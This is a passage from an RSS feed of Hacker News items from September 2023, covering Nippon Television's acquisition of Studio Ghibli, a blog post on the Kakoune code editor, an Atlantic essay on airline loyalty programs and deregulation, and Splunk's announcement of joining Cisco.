Source : <a href="https://www.oricon.co.jp/news/2295679/full/" target="_blank">Oricon</a></p><div><p><img src="https://www.catsuka.com/interf/images/english_flag.gif"> <b>English audience</b> :</p><p>Nippon Television has just acquired Studio Ghibli, which will become a subsidiary of their company.<br>
Producer Toshio Suzuki (75y old) was looking for a successor, and proposed Goro Miyazaki, but Hayao Miyazaki (82y old) refused (and so did Goro).<br>
Nippon Television was already a long-standing partner of Ghibli ("Friday Road Show").</p><p>(2023/09/21)</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why Kakoune (123 pts)]]></title>
            <link>https://andreyor.st/posts/2023-09-20-why-kakoune/</link>
            <guid>37596776</guid>
            <pubDate>Thu, 21 Sep 2023 12:42:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://andreyor.st/posts/2023-09-20-why-kakoune/">https://andreyor.st/posts/2023-09-20-why-kakoune/</a>, See on <a href="https://news.ycombinator.com/item?id=37596776">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
    <p>Recently I’ve stumbled upon a video about Kakoune, a code editor: <a href="https://www.youtube.com/watch?v=5WLlLxU2EZE" target="_blank">Idiot user tries to use Kakoune (for notes? Also Helix?)</a>.
Funnily enough, I was <a href="https://www.youtube.com/watch?v=5WLlLxU2EZE&amp;t=1004s" target="_blank">mentioned</a> in this video, which was a surprise, and made me laugh for quite a while:</p>
<blockquote>
<p>Let’s go back to the official plugins page.
This guy has made a bunch of plugins.
<strong>Who is he?</strong>
<em>How is he able to make such good use of Kakoune?</em>
<strong>Oh, he’s an Emacs user!</strong>
<strong>Of course!</strong></p>
</blockquote>
<p>Yeah, I am.</p>
<p>Even though the video <strong>is</strong> about Kakoune, the author’s main focus is note-taking and the oddities that come with this process when using a <em>code editor</em> to edit <em>text</em>.
Kakoune advertises itself as a code editor for the most part, and I have to agree.
As far as I know, Maxime Coste (<a href="https://github.com/mawww" target="_blank">@mawww</a>), the creator of Kakoune, made it because of the desire for a better programming experience.
As a result, a small and contained code editor was made.
And I can appreciate a desire of the system one can fully grasp and understand.</p>
<p>Kakoune is relatively small, compared to Emacs and Vim that is.
It doesn’t feature a scripting language, instead relying on shelling out if you need any programmable features.
It’s a clever trick, and the editor exposes its internal state as a set of shell variables, so you still can do interactive things based on your workflow.
And I did a lot of this back in the day when I used Kakoune.</p>
<p>I have mentioned Kakoune in this blog previously, but it was rather sparse.
The reason for that is stated in the video pretty accurately - I use Emacs and not Kakoune, so there’s little to no reason for me to write about it besides occasional praise or comparisons.
I mention it on my about page, and in various text-editor-related posts, but that’s it.
I don’t participate in the Kakoune community anymore, and no longer actively maintain my packages, as I no longer use Kakoune.</p>
<p>But I still need to address <a href="https://youtu.be/5WLlLxU2EZE?t=1017" target="_blank">this</a> point of the video - I wasn’t an Emacs user when I started with Kakoune.
Before Kakoune I was a Vim user!
And transition from Vim to Kakoune was caused by several factors, one of which is again stated in the video:</p>
<blockquote>
<p>…and people have written so many damn Vim plugins over the years that if you have a need it’s already been addressed like three or four different ways.
So with Vim you could just piece together your ideal text editor like LEGO bricks…</p>
</blockquote>
<p>And that’s exactly my problem with Vim - too many ways to do the same thing.
At the time, I was working with SoC in C and started using the <a href="https://github.com/dense-analysis/ale" target="_blank">Ale</a> plugin for asynchronous linting of the project, as the synchronous linting was quite slow.
This was before LSP inception - just look at <a href="https://github.com/dense-analysis/ale/blob/master/supported-tools.md" target="_blank">how many tools Ale supports</a>.
As far as I remember LSP was added to Ale much later, when competing plugins showed up.</p>
<p>Competing plugins.</p>
<p>There’s nothing bad with competition on its own, and in Emacs, this is also present, with many plugins, but in Vim’s case, I feel that people created most of the plugins purely because of the NIH<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> syndrome.
I lost count of how many plugins provided autocomplete interfaces, there were tons of list-narrowing frameworks, plugin managers, and snippet managers, and everything was poorly integrated with each other.
I remember that some autocomplete plugins did not integrate well or at all with snippets, some synchronous completion providers were not supported by asynchronous completion frameworks, and so on.
Again, this was before LSP came to the scene and basically became a standard for these features.
So perhaps the situation is a bit better today, but I still have doubts.
NeoVim people are going crazy over Lua API, writing their configs in Fennel, and making new Lua-based plugins that may or may not be compatible with the rest of the ecosystem.</p>
<p>Fact is, you <em>can</em> piece your dream text editor like <em>LEGO</em> bricks, just beware that some of these bricks are actually <a href="https://en.wikipedia.org/wiki/Lego_Duplo" target="_blank">Duplo</a> blocks, some are <a href="https://en.wikipedia.org/wiki/Cobi_%28building_blocks%29" target="_blank">COBI</a> bricks, lots and lots are probably <a href="https://brickscompare.com/brands/8-lele" target="_blank">LELE</a>, and some are even freakin’ <em><a href="https://andreyor.st/2023-09-20-why-kakoune/oleg.jpg">OLEG</a></em>.
Well, at least that was the situation when I used Vim, I gave up on updating my config around 2018 and made the switch to Kakoune.
By that time I already made three plugins for Vim because I was unsatisfied with existing ones, but they were crappy too.
Integrating these plugins into different other plugins was a huge pain.
So I <a href="https://github.com/andreyorst/dotfiles/commit/d91e8ca4ccb59c89c2043d5d2c4eb8af3fbe498d" target="_blank">made the switch</a>.
You can trace the history from that point if you’re interested in my Kakoune journey (why would you be though).</p>
<p>Obviously, I missed a lot of features from Vim, and Kakoune actually has an entry on their wiki on how to migrate from Vim.
Unfortunately, though, the suggestions were either too hardcore-minimalist or uncooperative.
For example, Vim’s <code>smarttab</code> feature didn’t exist, and <code>expandtab</code> was <a href="https://github.com/mawww/kakoune/wiki/Indentation-and-Tabulation/e6756dc1a8af07add53145a9251eeb2ba0e0c5a5" target="_blank">suggested</a> to be done via hooks.
Not that it was wrong, but it was suggested when people asked about a very specific feature of Vim, and these did not provide the same feature as in Vim.
So I started writing plugins.</p>
<p>However, Kakoune didn’t have conventional plugins at all at that time.
Well, there was a section with plugins on the official page, but there was no real ecosystem.
There was nothing such as Vimplug if you will.</p>
<p>Installing plugins meant you had to manually copy files around, or load them pathogen-style, but the process wasn’t convenient or easy to automate in my opinion.
Updating plugins installed in this way was problematic too.
This motivated me to make <a href="https://github.com/andreyorst/plug.kak" target="_blank">plug.kak</a>.
And then I started experimenting more and more with other interesting plugins.</p>
<p>But, around the same time I switched to Kakoune, I briefly tried Emacs.
In reality, I tried Emacs like 4 times at that point, the earliest one dates back to around 2010.
All four times I did not succeed, but something gravitated me to it for some reason.
This last one actually was a reason why I made some plugins like <a href="https://github.com/andreyorst/langmap.kak" target="_blank">langmap.kak</a> or <a href="https://github.com/andreyorst/kaktree" target="_blank">kaktree</a>, which resemble what I saw in Emacs at that point.
Many plugins were inspired by Vim, like <a href="https://github.com/andreyorst/smarttab.kak" target="_blank">smarttab.kak</a>, <a href="https://github.com/andreyorst/powerline.kak" target="_blank">powerline.kak</a>, <a href="https://github.com/andreyorst/fzf.kak" target="_blank">fzf.kak</a>, <a href="https://github.com/andreyorst/tagbar.kak" target="_blank">tagbar.kak</a>, equivalents to which I daily used in Vim before.
And at that time, Kakoune really did everything I needed and was a very capable code editor.</p>
<p>But I still wanted something more.
So why I made the switch to Emacs - but for a bit different reasons.</p>
<p>First of all, I started enjoying writing more prose instead of just writing code.
And if you’ve watched the video I linked above, the author similarly wants a text editor, not a code editor.
There’s <a href="https://www.youtube.com/watch?v=XRpHIa-2XCE" target="_blank">another video</a> on their channel about note-taking, featuring a lot of programs made specifically for this task, and it features a text editor section at the end in which the author talks about Emacs and Vim, briefly touching Kakoune and Helix.
What they’re saying about Emacs is also very similar to what I’ve experienced, although I didn’t use an Emacs distribution, I started with vanilla<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</p>
<p><strong>Org Mode.</strong></p>
<p>I don’t know how to explain this to a non-Emacs, non-Org person, but every time someone asks the “Why Emacs?” question, Org Mode is somewhere at the top of the answers.
And I never understood that, until I tried for myself.
And boy are they right.
But before I understood that, there was a <a href="https://github.com/andreyorst/dotfiles/commit/442941e8a230ccbb075a7bdfcf6075367c46cd73" target="_blank">long</a> period of <a href="https://github.com/andreyorst/dotfiles/commit/9088b4fd041005c6143de8de012541f0bc6f913f" target="_blank">adoption</a>.
I still used Kakoune, but more and more I was shifted towards Emacs - it slowly consumed me.</p>
<p>A big part of that was that I started writing in Lisps.
Emacs is <strong>the king</strong> when it comes to Lisp editing.
Plugins for various Schemes, that I used to do tasks from the SICP book were amazing, and Kakoune <code>:repl</code> command paled in comparison.
Though I can’t blame anyone here - Emacs is a lisp machine on its own, it’s bound to have great lisp editing experience.</p>
<p>Though lisp wasn’t my primary language back then, more like a novelty.
I used Rust and considered switching jobs from a C engineer to a Rust back-end developer.
Rust seemed both a perspective and a <em>safe</em> enough bet for the foreseeable future.
Who knew how the tables would turn?!</p>
<p>Kakoune actually was great as a Rust IDE of sorts.
The <a href="https://github.com/kak-lsp/kak-lsp" target="_blank">kak-lsp</a> plugin was on it, written in Rust it supported Rust well.
And it helped me at work with C too.
That was 2019, the year I started using Emacs for real.</p>
<p>That year, I made my first, kinda big post, in which I realized that I wanted to write more.
Ironically, it was a <a href="https://discuss.kakoune.com/t/i-have-been-using-emacs-at-work-for-whole-week/" target="_blank">post about Emacs on the Kakoune forum</a>.
It was even written partly in Emacs and partly in Kakoune - I was comparing editors at that time, much like the author of already mentioned videos.
But this day signified that I was ready to fully migrate to Emacs - my config was more or less ready for work at that point.
Emacs seemed better at writing, although I was missing cool Kakoune features, such as multiple selections, a lot.
I started writing this blog in 2020, and it was done in Emacs from the get-go.
Not so long after that, I moved to Emacs <a href="https://github.com/andreyorst/dotfiles/commit/0e31f525b069f097a99cd1876a009f03cd26299c" target="_blank">completely</a>.</p>
<p>I used Kakoune for 1.9835616438356165 years (first commit on Jul 24 2018, last commit on Jul 17 2020).</p>
<p>But this post actually is called “Why Kakoune” and not “Why I switched to Emacs”, so let’s address that!</p>
<h2 id="why-kakoune">Why Kakoune</h2>
<p>What an awfully long preamble.
If you read that, you have my thanks.
If not - fair enough.</p>
<p>I think it’s kinda weird to read reasoning on why someone should use Kakoune from someone who’s not using Kakoune right now and hasn’t for another three years already.
But, as far as I can see, not much has changed in Kakoune since!
Which, actually, is great - I can actually just check out to a commit previous to the one I deleted my Kakoune config in the <code>dotfiles</code> repository, and run it.
A fresh clone of Kakoune’s latest stable release builds in just two minutes on my machine, and loads my old configuration without too many errors:</p>
<figure><img src="https://andreyor.st/2023-09-20-why-kakoune/kakoune.png">
</figure>

<p>At this point of the post I wanted to write about stability, but as it seems, the situation isn’t that great.</p>
<ul>
<li>Some plugins simply no longer exist.</li>
<li>Some defaults were changed in 2022, making keys behave differently (can be turned back via a remap)</li>
<li>Some changes were made to how Kakscript is interpreted.</li>
<li>Most of my plugins broke (but that’s on me).</li>
<li>There’s possibly more, but I’m out of the loop.</li>
</ul>
<p>What’s hasn’t changed is that <a href="https://discuss.kakoune.com/t/ive-lost-my-syntax-highlighting/" target="_blank">people</a> <a href="https://discuss.kakoune.com/t/autoload-directory-disables-doc-command/1656" target="_blank">still</a> <a href="https://github.com/mawww/kakoune/issues/4301" target="_blank">stumble</a> on the <code>autoload</code> directory after all these <a href="https://github.com/mawww/kakoune/issues/1" target="_blank">years</a>.
Because there’s no plugin manager in Kakoune, it relies on storing scripts you want to load automatically during startup in the <code>~/.config/kak/autoload</code> directory.
This, however, for some weird reason, disables loading a system-wide Kakoune <code>autoload</code> directory, and Kakoune simply stops loading all of its inbuilt features that are shipped as <code>.kak</code> files.
I also experienced this problem, and it was one of the main reasons for making <code>plug.kak</code>.
So, if anything above seems too weird, perhaps Kakoune is not for you.</p>
<p>But, given all that, Kakoune hasn’t changed that drastically over the three years I haven’t used it, and that’s a good thing.
Even now, I can still edit files in it pretty comfortably after my brain does the switch from Emacs keybindings to a modal model.
For the most part, that is, some habits are hard.</p>
<p>But one thing, that I think can be a main reason why people should try Kakoune, in my opinion, is its POSIX integration.
Back in the day, I really liked this idea, can’t say so today<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>, <strong>but</strong>, it’s still a good reason why Kakoune is interesting.</p>
<p>I mentioned that I made plugins for Kakoune, and because of that I now know POSIX sh pretty well.
Not that I need this knowledge that often, but when I do, I’m glad Kakoune taught me well.
The same goes for other POSIX tools - Kakoune basically forces you to learn your shell stuff, because there’s no other way to be productive in Kakoune.
Everything is done via shelling out to use some tool like <code>fmt</code>, <code>grep</code>, <code>find</code>, etc.</p>
<p>And when shell tools are not enough you can always call different programming languages from the shell.
For example, some of my plugins are written in Perl of all languages.
And while I can’t say that I’m proud of that, or that I know Perl that well, I can still say that Kakoune <a href="https://github.com/andreyorst/langmap.kak/blob/fe72a9980988c97ec901df1c36129b6959468b08/perl/langmap.pl" target="_blank">made</a> me <a href="https://github.com/andreyorst/langmap.kak/blob/fe72a9980988c97ec901df1c36129b6959468b08/perl/display_layout.pl" target="_blank">learn</a> <a href="https://github.com/andreyorst/kaktree/blob/acd47e0c8549afe1634a79a5bbd6d883daa8ba0a/perl/kaktree.pl" target="_blank">Perl</a>, well, to some degree.
Also, <a href="https://github.com/andreyorst/dotfiles/blob/187ebb84f9542b76a4f3c3e08f9533cd8187faa1/.config/kak/commands.kak#L151-L192" target="_blank">Awk</a>.
And I still occasionally use both when I need to send a code snippet to my colleague so that they can send me some filtered logs instead of full logs.
Because that’s what these tools excel at, and learning how to use them from within an editor really makes it apparent how they can be useful.
So Kakoune really helps you learn your standard tools, and some extra things too.</p>
<p>Another thing I think can be said is that Kakoune really makes you learn and understand regular expressions.
When I started using Kakoune, I once told my friend that I started using an editor that is built around using regular expressions for text manipulation.
They were quite skeptical, because I didn’t know regular expressions back then, and they had some experience and said that it’s a terrible idea to use them at all.
But turns out, that regular expressions are actually easy to learn, and Kakoune really helps with that, because you’re constantly creating multiple selections, selections in selections, and filtering selections - all done with regexes.
So, if you think that regexes are hard and you’ll never learn them (and you’re a Vim user by chance), give Kakoune a try.</p>
<p>And finally, Kakoune is just fun!
Especially if you’re a seasoned Vim user, the inverted paradigm of object-verb really messes with your brain.
I think Kakoune features a really unique editing model, where it doesn’t need any separate mode for selecting text - all motions do it automatically.
When I started, I adjusted to the object verb paradigm pretty quickly, it’s very natural to how things are done - in real life, we usually don’t think upfront what we want to clean and then how many of <em>what was that</em>, ah yeah the shelves.
We think that these shelves are dusty and we need to clean them.
I should probably do it right now.</p>
<p>Anyway, a TL;DR for this could as well have been:</p>
<blockquote>
<p>Kakoune gives you:</p>
<ul>
<li>Small and understandable core.</li>
<li>Proficiency with POSIX tools,
<ul>
<li>and maybe even some programming languages other than <code>sh</code>.</li>
</ul>
</li>
<li>Structural regular expressions as a central way of text manipulation.
<ul>
<li>With multiple selections created via regular expressions, acting upon regular expressions.</li>
</ul>
</li>
<li>Fresh take on the modal editing paradigm.</li>
</ul>
</blockquote>
<p>So, yeah, Kakoune definitively deserves your attention, if you’re into experiments with your workflow.
I, certainly, am.
At least, I was, now I do everything from Emacs.</p>


  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Airlines Are Just Banks Now (302 pts)]]></title>
            <link>https://www.theatlantic.com/ideas/archive/2023/09/airlines-banks-mileage-programs/675374/</link>
            <guid>37596755</guid>
            <pubDate>Thu, 21 Sep 2023 12:40:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theatlantic.com/ideas/archive/2023/09/airlines-banks-mileage-programs/675374/">https://www.theatlantic.com/ideas/archive/2023/09/airlines-banks-mileage-programs/675374/</a>, See on <a href="https://news.ycombinator.com/item?id=37596755">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><header data-event-module="hero"><div><div><p>They make more money from mileage programs than from flying planes—and it shows.</p></div><div><figure><div><picture><img alt="Illustration of planes against a backdrop of a credit card" sizes="(min-width: 976px) 976px, 100vw" srcset="https://cdn.theatlantic.com/thumbor/i1zxOBjUfAa-LcAk39Vpb8-iF8U=/0x0:2000x1125/750x422/media/img/mt/2023/09/airlines_are_banks/original.jpg 750w, https://cdn.theatlantic.com/thumbor/wbxnD5HvcVxcZq5D4_fZVem-SAU=/0x0:2000x1125/828x466/media/img/mt/2023/09/airlines_are_banks/original.jpg 828w, https://cdn.theatlantic.com/thumbor/AY1IMnrdT1NrCRmGfjeURl9WzME=/0x0:2000x1125/960x540/media/img/mt/2023/09/airlines_are_banks/original.jpg 960w, https://cdn.theatlantic.com/thumbor/tYcp3eiVo3YWMCqFQx21qfiBwtE=/0x0:2000x1125/976x549/media/img/mt/2023/09/airlines_are_banks/original.jpg 976w, https://cdn.theatlantic.com/thumbor/_Tgm4RT8P6wSfIJSTVjg7zzGljA=/0x0:2000x1125/1952x1098/media/img/mt/2023/09/airlines_are_banks/original.jpg 1952w" src="https://cdn.theatlantic.com/thumbor/AY1IMnrdT1NrCRmGfjeURl9WzME=/0x0:2000x1125/960x540/media/img/mt/2023/09/airlines_are_banks/original.jpg" width="960" height="540"></picture></div><figcaption>Illustration by The Atlantic. Sources: Getty.</figcaption></figure></div></div><div><p><time datetime="2023-09-21T11:00:00Z">September 21, 2023, 7 AM ET</time></p></div><gpt-ad format="injector" sizes-at-0="mobile-wide" targeting-pos="injector-article-start" sizes-at-976="desktop-wide"></gpt-ad></header><section data-event-module="article body"><p>L<span>ast week</span>, Delta Air Lines announced <a data-event-element="inline link" href="https://thepointsguy.com/news/delta-skymiles-changes/">changes</a> to its SkyMiles program that will make accruing status and taking advantage of perks much harder. Instead of relying on a combination of dollars spent and miles traveled in the air, Delta will grant status based on a single metric—dollars spent—and raise the amount of spending required to get it. In short, SkyMiles is no longer a frequent-flier program; it’s a big-spender program. These changes are so drastic that one of the reporters at the preeminent travel-rewards website The Points Guy <a data-event-element="inline link" href="https://thepointsguy.com/news/why-i-wont-chase-airline-status/">declared</a> that he’s going to “stop chasing airline status.”</p><p>When even the points insiders are sick of playing the mileage game, something has clearly gone wrong. In fact, frequent-flier programs are a symptom of a much deeper rot in the American air-travel industry. And although getting mad at airlines is perfectly reasonable, the blame ultimately lies with Congress.</p><p>From the late 1930s through the ’70s, the federal government regulated airlines as a public utility. The Civil Aeronautics Board decided which airlines could fly what routes and how much they could charge. It aimed to set prices that were fair for travelers and that would provide airlines with a modest profit. Then, in 1978, Congress passed a sweeping law deregulating the airline industry and ultimately abolishing the CAB. Unleashed from regulation, airlines devised new tactics to capture the market. American Airlines was one of the most aggressive. In the lead-up to the deregulation bills, it created discount “super saver” fares to sell off the final few remaining seats on planes. That meant cheap prices for last-minute travelers and more revenue for American, because the planes were going to take off whether or not the seat was filled. But these fares upset business travelers, who tended to buy tickets further in advance for higher prices. So in <a data-event-element="inline link" href="https://www.yahoo.com/news/timeline-events-american-airlines-history-011902886.html?guccounter=1">1981</a>, American developed AAdvantage, its frequent-flier program, to give them additional benefits. Other airlines followed suit.</p><p id="injected-recirculation-link-0" data-view-action="view link - injected link - item 1" data-event-element="injected link" data-event-position="1"><a href="https://www.theatlantic.com/newsletters/archive/2022/06/summer-air-travel-flights-cancelled/661385/">Read: Air travel is a disaster right now. Here’s why.</a></p><p>In the early years, these programs were simple, like the punch card at a café where your 11th coffee is free. But three big changes transformed them into the systems we know today. First, in 1987, American partnered with Citibank to offer a branded credit card that offered points redeemable for flights on the airline. Second, in the ’90s, the airlines proliferated the number of fare classes, charging differential prices for tickets. With more complicated fare structures came the third change: Virgin America realized that the amount people spend on a flight, based on the fare class, is more important to their bottom line than the number of miles flown. So, in 2007, it introduced a loyalty <a data-event-element="inline link" href="https://www.usatoday.com/story/travel/roadwarriorvoices/2016/02/25/frequent-flier-miles-points-loyalty-programs/80860962/">program</a> rewarding money spent rather than mileage accrued.</p><p>These three shifts fundamentally transformed the airline industry. They turned frequent-flier systems into the sprawling points systems they are today. And they turned airlines into something more like financial institutions that happen to fly planes on the side.</p><p>Here’s how the system works now: Airlines create points out of nothing and sell them for real money to banks with co-branded credit cards. The banks award points to cardholders for spending, and both the banks and credit-card companies make money off the swipe fees from the use of the card. Cardholders can redeem points for flights, as well as other goods and services sold through the airlines’ proprietary e-commerce portals.</p><p>For the airlines, this is a great deal. They incur no costs from points until they are redeemed—or ever, if the points are forgotten. This setup has made loyalty programs highly lucrative. <a data-event-element="inline link" href="https://www.fastcompany.com/90934980/how-much-do-we-charge-to-our-delta-air-american-express-cards-its-a-lot">Consumers now</a> charge nearly 1 percent of U.S. GDP to Delta’s American Express credit cards alone. A 2020 analysis by the <i>Financial Times</i> <a data-event-element="inline link" href="https://www.ft.com/content/1bb94ed9-90de-4f15-aee0-3bf390b0f85e">found</a> that Wall Street lenders valued the major airlines’ mileage programs more highly than the airlines themselves. United’s MileagePlus program, for example, was valued at $22 billion, while the company’s market cap at the time was only $10.6 billion.</p><p>Is this a good deal for the American consumer? That’s a trickier question. Paying for a flight or a hotel room with points may feel like a free bonus, but because credit-card-swipe fees increase prices across the economy—Visa or Mastercard takes a cut of every sale—redeeming points is more like getting a little kickback. Certainly the system is bad for Americans who don’t have points-earning cards. They pay higher prices on ordinary goods and services but don’t get the points, effectively <a data-event-element="inline link" href="https://www.brookings.edu/articles/how-credit-card-companies-reward-the-rich-and-punish-the-rest-of-us/">subsidizing</a> the perks of card users, who tend to be wealthier already.</p><p>Like the federal reserve, airlines issue currency—points—out of thin air. They also get to decide how much that currency is worth and what it can be spent on. This helps explain why the points system feels so opaque and, often, unfair. Online analysts try to offer estimates of points’ cash value, but airlines can <a data-event-element="inline link" href="https://viewfromthewing.com/delta-air-lines-is-even-devaluing-your-banked-rollover-elite-qualifying-miles/">reduce</a> these <a data-event-element="inline link" href="https://viewfromthewing.com/delta-ceo-were-not-done-making-changes-to-skymiles-status-or-first-class/">values</a> after the fact and change how points can be redeemed. Airlines even <a data-event-element="inline link" href="https://www.forbes.com/advisor/credit-cards/is-buying-frequent-flyer-miles-ever-a-good-deal/">sell</a> <a data-event-element="inline link" href="https://www.nerdwallet.com/article/travel/times-it-actually-makes-sense-to-buy-miles">points</a> at above their exchange-rate valuation, meaning that people are paying for something worth less than the money they’re buying it with, in part because it’s so hard to know what the real value is.</p><p>In this context, it’s easy to see why Delta is making changes. The shift to a focus on spending, rather than mileage, has long been coming, because of the rise of multiple fare classes and the decoupling of mileage and revenue. Limiting benefits and increasing the requirements for status, meanwhile, looks like a way to spread out costs: 1 percent of GDP spending is a lot of outstanding points that could be redeemed.</p><p>Still, you might wonder how airlines can get away with angering their customers by devaluing loyalty programs. Aren’t they worried that those customers will get a little less loyal? Well, not really. The U.S. has only four major carriers, which <a data-event-element="inline link" href="https://www.npr.org/2023/03/07/1161640389/jetblue-spirit-airlines-doj-lawsuit">account</a> for more than three-quarters of the market, and they tend to move in lockstep. Indeed, American Airlines recently made a <a data-event-element="inline link" href="https://thepointsguy.com/news/american-aadvantage-vs-delta-skymiles/">similar</a> change to its mileage program. Customers don’t have many other places to go.</p><p>I<span>n this</span> and other respects, the strange evolution of airlines into quasi-banks reflects how badly deregulation has gone. Regulation carefully set the terms under which airlines could do business. It was designed to ensure that they remained a stable business and a reliable mode of transportation. Deregulation, in turn, allowed the airlines to pursue profits in whatever way they could—including getting into the financial sector.</p><p>The proponents of deregulation made a few big promises. The cost of flying would go down once airlines were free to compete on price. The industry would get less monopolistic as hundreds of new players entered the market, and it would be stable even without the government guaranteeing profitable rates. Small cities wouldn’t lose service. In the deregulators’ minds, airlines were like any other business. If they were allowed to compete freely, the magic of the market would make everything better. Whatever was good for the airlines’ bottom line would be good for consumers.</p><p>They were wrong. As I explain in my <a data-event-element="inline link" href="https://tertulia.com/book/why-flying-is-miserable-and-how-to-fix-it-ganesh-sitaraman/9798987053584?affiliate_id=atl-347">forthcoming book</a>, most of their predictions didn’t come true, because air travel isn’t a normal business. There are barriers to entry, such as the fixed supply of airport runways and gates. (And, for that matter, mileage programs, designed to keep customers from ditching an established airline for a rival.) There are network effects and economies of scale. There are high capital costs. (Airplanes aren’t cheap.) The idea that anyone could successfully start an airline and outcompete the big incumbents never made much sense.</p><p>After a relatively short period of fierce competition, the deregulated era quickly turned to consolidation and cost-cutting, as dozens of airlines either went bankrupt or were acquired. Service keeps getting worse, because the airlines, facing little competition, have nothing to fear from antagonizing passengers with cramped legroom, cancellations, and ever-multiplying fees for baggage and snacks. Worse still, without mandated service, cities and regions across the country have lost commercial air service, with <a data-event-element="inline link" href="https://washingtonmonthly.com/2012/03/01/terminal-sickness/">serious consequences</a> for their economies. And when a crisis like 9/11 or the coronavirus pandemic comes along, the airlines—which prefer to direct their profits to stock buybacks rather than rainy-day funds—need massive financial relief from the federal government.</p><p id="injected-recirculation-link-1" data-view-action="view link - injected link - item 2" data-event-element="injected link" data-event-position="2"><a href="https://www.theatlantic.com/technology/archive/2023/06/airline-customer-service-chatbot-ai/674412/">Read: Somehow, airline customer service is getting even worse</a></p><p>Deregulation even failed to deliver the one thing it is sometimes credited with: lowering prices. Airfare did get cheaper in the years after the 1978 deregulation law. But the cost of flying had already been falling before<i> </i>deregulation, and it kept falling after at about the same rate.</p><p>The old system of airline regulation wasn’t perfect. Barred from competing directly on price, the airlines got into an amenities arms race that notoriously included <a data-event-element="inline link" href="https://www.youtube.com/watch?v=KnimcgMPuXk">in-flight piano bars</a>. But the cure was worse than the disease. The industry went from being a regulated oligopoly, which had real problems, to an unregulated oligopoly, which we are now seeing is much worse.</p><p>Airlines serve a vital public need, just like railroads, the electric grid, and communication networks. They also exist within a system of special privileges from the government. The public has built and paid for a substantial federal infrastructure to coordinate flights safely. Historically, these are all standard reasons to regulate an industry. A modernized set of rules could arrest the trajectory of airlines becoming financialized e-commerce platforms—and maybe even get them to focus on making air travel less miserable.</p><div data-view-action="view - affiliate module" data-view-label="Why Flying Is Miserable - And How To Fix It"><a href="https://web.tertulia.com/book/9798987053584?affiliate=atl-347" rel="noopener noreferrer" data-label="Why Flying Is Miserable - And How To Fix It" data-action="click link - affiliate module - book cover" target="_blank"><picture><img alt="" loading="lazy" srcset="https://cdn.theatlantic.com/thumbor/Zh_7jqRmMvGK6Gg6nXJl9R3pn9E=/0x0:333x500/80x120/media/img/book_reviews/2023/09/19/51XeRgTLhgL._SL500_/original.jpg, https://cdn.theatlantic.com/thumbor/KdBuSjWrqT4SQxIcOGX5eMfm2WE=/0x0:333x500/160x240/media/img/book_reviews/2023/09/19/51XeRgTLhgL._SL500_/original.jpg 2x" src="https://cdn.theatlantic.com/thumbor/Zh_7jqRmMvGK6Gg6nXJl9R3pn9E=/0x0:333x500/80x120/media/img/book_reviews/2023/09/19/51XeRgTLhgL._SL500_/original.jpg" width="80" height="120"></picture></a></div><div><hr><p>​When you buy a book using a link on this page, we receive a commission. Thank you for supporting<!-- --> <span>The Atlantic.</span></p></div></section><gpt-ad format="injector" sizes-at-0="mobile-wide,native,house" targeting-pos="injector-most-popular" sizes-at-976="desktop-wide,native,house"></gpt-ad></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[BrainTree has been down for more than 7 hours now (134 pts)]]></title>
            <link>https://www.paypal-status.com/incident/production</link>
            <guid>37596498</guid>
            <pubDate>Thu, 21 Sep 2023 12:15:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.paypal-status.com/incident/production">https://www.paypal-status.com/incident/production</a>, See on <a href="https://news.ycombinator.com/item?id=37596498">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Cisco Acquires Splunk (691 pts)]]></title>
            <link>https://www.splunk.com/en_us/blog/leadership/splunk-and-cisco-unite-to-accelerate-digital-resilience-as-one-of-the-leading-global-software-companies.html</link>
            <guid>37596497</guid>
            <pubDate>Thu, 21 Sep 2023 12:15:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.splunk.com/en_us/blog/leadership/splunk-and-cisco-unite-to-accelerate-digital-resilience-as-one-of-the-leading-global-software-companies.html">https://www.splunk.com/en_us/blog/leadership/splunk-and-cisco-unite-to-accelerate-digital-resilience-as-one-of-the-leading-global-software-companies.html</a>, See on <a href="https://news.ycombinator.com/item?id=37596497">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-emptytext="Blogs details page content">
            <p>For nearly 20 years, Splunk has been delivering on the idea that harnessing the power of data can help our customers solve the most complex problems that test the resilience of their digital systems. In recent years, the advent of AI and continued demand for digital transformation have created a world of new possibilities, along with complex challenges. Organizations now have a greater surface area to protect and infinitely more data to manage — often across fragmented, hybrid and multi-cloud environments.</p>
<p>As our customers have had to evolve to meet these challenges, Splunk has transformed to deliver exceptional value. Along the way, we have stayed true to our customer promise: to be a step ahead of their needs and continually deliver meaningful innovations that keep mission-critical systems secure and reliable.&nbsp;</p>
<p><span><b>Today, we took the next step in our journey to advance this promise and realize our vision for the future of security and observability by joining forces with Cisco.</b></span></p>
<p>Uniting with Cisco is a transformative milestone for Splunk and our customers, partners, employees and shareholders. Cisco and Splunk have had a long and successful partnership, underpinned by products and capabilities that fundamentally complement each other and enhance the value we deliver to customers. By bringing our two companies together, we will be able to build on our industry-leading solutions to deliver the most comprehensive visibility and insight in the market across security, observability and network operations. Combining our capabilities will allow us to accelerate our work to transform the industry for the benefit of all of our stakeholders.</p>
<p>Innovation, execution and the drive to deliver on our customer promise will always be at the core of Splunk’s mission. With Cisco, we will have greater resources to innovate and serve our customers, accelerating their digital resilience. Cisco’s world-class go-to-market engine and extensive global network of trusted partners can bring Splunk’s enterprise-grade AI-powered, security and observability solutions to even more customers worldwide. At the same time, we will have the opportunity to accelerate the pace of innovation and develop game-changing solutions to help businesses access, analyze and act on data faster and more securely than ever before. Simply put, our leading technologies, coupled with Cisco’s technology portfolio and powered by its extensive go-to-market capabilities and global scale, is a winning combination for our customers, our industry and our people.</p>
